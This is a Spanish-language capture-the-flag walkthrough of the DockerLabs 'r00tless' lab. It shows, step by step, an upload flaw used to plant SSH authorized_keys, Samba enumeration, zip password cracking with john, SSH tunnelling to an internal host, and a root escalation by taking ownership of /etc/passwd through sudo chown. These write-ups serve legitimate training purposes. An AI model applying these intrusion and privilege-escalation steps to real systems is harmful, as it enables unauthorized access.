nmap: 80,22,139,445

![image](https://github.com/user-attachments/assets/c93e0c93-23ce-460d-b526-85e968e6f4ec)

---
en la pagina principal nos da:

![image](https://github.com/user-attachments/assets/fcc9059f-34dc-4407-a66f-0ffb9b1e35fe)

hacemos un gobuster:

![[dockerlabs/dificil/r00tless/gobuster.png]]

nos dio upload.php

![[upload.png]]

vuelvo hacer un gobuster pero agrego un .txt

![[readme.png]]

entramos y nos da

![[readme2.png]]

Esto significa que si realmente se sube en ".ssh", podemos subir nuestro "id_rsa.pub" con el nombre "authorized_keys" y conectarnos sin necesidad de clave, nos faltaría usuarios 

pero podemos enumerar con: 
> enum4linux 172.18.0.2

nos da:
 ![[enum4.png]]
 

creamos un id_rsa 

    ssh-keygen -t rsa -b 4096

![[id_rsa1.png]]

nos dara: id_rsa  id_rsa.pub  

pasamos la clave a un authorized_keys

![[echo.png]]

le damos permisos: 
> chmod 600 id_rsa 

subimos el authorized_keys

![[subida.png]]

ahora en el terminal colocamos: 
>  ssh passsamba@172.18.0.2 -i id_rsa

 estamos dentro

![[dockerlabs/dificil/r00tless/conexion.png]]

al hacer un "ls", nos da esto:
>cat note.txt

![[samba.png]]

por la similitud  con  un nombre de usuario, probamos como contraseña:
> su sambauser / sambaarribasiempre

y ahora somos sambauser

como no hay nada, encontré para ver posibles directorios:

    smbmap -u "sambauser" -p "sambaarribasiempre" -d workgroup -H 172.19.0.2

![[samba2.png]]

nos dio dos:
> read_only_share

nos conectamos como clientes.

    smbclient //172.18.0.2/read_only_share -U sambauser -W workgroup  

la contraseña es la misma y dentro nos pasamos con get el zip que hay

![[scret.png]]


como pide contraseña la sacamos:

    zip2john secret.zip > hash.txt 
    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
    
> contraseña: qwert

![[dockerlabs/dificil/r00tless/hash.png]]

le colocamos al txt cat y nos da:
> root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==

en la misma terminal colocamos:
> echo "cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==" | base64 -d

nos da la contraseña

![[dockerlabs/dificil/r00tless/zip.png]]

entramos por ssh en una terminal y colocamos la contraseña con el usuario "root-false"

dentro hay un: message.txt que dice:

![[pinguino1.png]]

encontramos esto

![[curl1.png]]

ejecutamos el comando

     curl -vvv -d 'username=mario&password=pinguinodemarioelmejor' http://10.10.11.5

lo que lanzamos es lo del mensaje que vimos 

![[curl3.png]]

lanzamos:

     curl -vvv http://10.10.11.5/super_secure_page/admin.php/

si se hace un: curl -v 10.10.11.5
nos mostrara código de una pagina que contiene un login en el puerto 80

hacemos este comando: 
> ssh root-false@172.18.0.2 -L 9090:10.10.11.5:80

y nos conectaremos otra vez

![[dockerlabs/dificil/r00tless/conexion2.png]]

nos vamos a firefox y buscamos esto:
> http://127.0.0.1:9090/

no me funciono pero del codigo anterior vi un "ultramegatexto.txt", lanzamos el siguiente comando

    curl http://10.10.11.5/ultramegatextosecret.txt


nos dio:

![[ultra.png]]

nos dará la pagina de login - admin
en el texto hay parte que me llamo la atención que parece contraseña que dice:
> Cristal_de_la_Aurora

la probamos en el usuario less que sale al final del texto.
y somos el usuario less 
al hacer sudo -l nos da: chown

![[conexion3.png]]

buscando encontré que podemos cambiar al propietario de la carpeta /etc/passwd
con este comando: 

    sudo chown less:less /etc/passwd

ahora hacemos un:

    nano /etc/passwd

![[Pasted image 20250115194824.png]]

![[dockerlabs/dificil/r00tless/cat.png]]

le quitamos la "x" a root 
guardamos y ejecutamos

![[dockerlabs/dificil/r00tless/root.png]]

su root
somos root! 
